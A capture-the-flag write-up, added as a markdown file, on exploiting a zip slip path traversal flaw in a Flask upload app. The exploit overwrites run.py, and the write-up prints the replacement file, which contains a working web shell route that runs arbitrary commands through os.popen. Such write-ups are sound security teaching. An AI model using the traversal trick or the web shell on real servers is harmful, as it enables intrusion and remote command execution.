@@ -1,0 +1,127 @@
+### Compare the Pair (Easy)
+---
+
+By viewing the web page webpage we see the source code of the site:
+
+```
+from flask import Flask, request
+import zipfile, os
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(32)
+app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
+app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'
+
+@app.route('/')
+def source():
+    return '
+
+%s
+
+' % open('/app/run.py').read()
+
+def zip_extract(zarchive):
+    with zipfile.ZipFile(zarchive, 'r') as z:
+        for i in z.infolist():
+            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
+                f.write(z.open(i.filename, 'r').read())
+
+@app.route('/zip_upload', methods=['POST'])
+def zip_upload():
+    try:
+        if request.files and 'zarchive' in request.files:
+            zarchive = request.files['zarchive']
+            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
+                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
+                zarchive.save(zpath)
+                zip_extract(zpath)
+                return 'Zip archive uploaded and extracted!'
+        return 'Only valid zip archives are acepted!'
+    except:
+         return 'Error occured during the zip upload process!'
+
+if __name__ == '__main__':
+    app.run()
+
+```
+
+By analysing the source code we can make a POST request to `/zip_upload` with a parameter name `zarchive` and the application will upload our zip file to `/tmp/uploads` and extract it. The vulnerable part of the code is `os.path.join(app.config['UPLOAD_FOLDER'], i.filename`. This joins the upload directory with the filename of the zipped file. We can try and exploit a zip slip vulnerability here.
+
+First lets try and upload a zip file. I used curl for this:
+
+<img src="images/image11.png" width="600">
+
+So we have uploaded and extracted our zip file successfully, now lets try and leverage the zip slip vulnerability.
+
+e.g:
+
+Since our upload folder is `/tmp/uplaods/` if we can provide a filename like `../../app/saintbarber.txt` we can extract the file to the web root directory `/app/`. 
+
+But how can we name a file with a forwardslash in the name? Im not sure if there is a better way but i zip the file normaly and open it in a hex editor and change the name how i like. 
+
+e.g:
+
+I will zip a file with the name `..A..AappAsaintbarber.txt` and open the file in a hex editor and change the `A` with a `/`:
+
+<img src="images/image12.png" width="600">
+
+
+But because the `run.py` file uses routing we will not be able to access our extracted files. Thats when i tried overwriting the run.py file to see what happens. Same a before i will create a file `..A..AappArun.py`, zip it and change the `A` to `/` and upload the file:
+
+
+<img src="images/image13.png" width="400">
+
+Good! Looks like we have overwriten `run.py`. Now i will upload a modified version of `run.py` to include a route that gives me a web shell, like so:
+
+```
+from flask import Flask, request
+import zipfile, os
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(32)
+app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
+app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'
+
+@app.route('/')
+def source():
+    return ' %s ' % open('/app/run.py').read()
+
+@app.route('/saint/<cmd>')
+def execute_cmd(cmd):
+    cmd = os.popen(cmd).read()
+    return '<pre> %s ' % cmd
+
+def zip_extract(zarchive):
+    with zipfile.ZipFile(zarchive, 'r') as z:
+        for i in z.infolist():
+            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
+                f.write(z.open(i.filename, 'r').read())
+
+@app.route('/zip_upload', methods=['POST'])
+def zip_upload():
+    try:
+        if request.files and 'zarchive' in request.files:
+            zarchive = request.files['zarchive']
+            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
+                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
+                zarchive.save(zpath)
+                zip_extract(zpath)
+                return 'Zip archive uploaded and extracted!'
+        return 'Only valid zip archives are acepted!'
+    except:
+         return 'Error occured during the zip upload process!'
+
+if __name__ == '__main__':
+    app.run()
+
+```
+
+
+<img src="images/image14.png" width="700">
+
+Done. Webshell was uploaded successfully and all we need to do it `cat flag_do_it_yourself.txt`.
+
+<img src="images/image15.png" width="700">
+
+---
+#### sAINT_barber
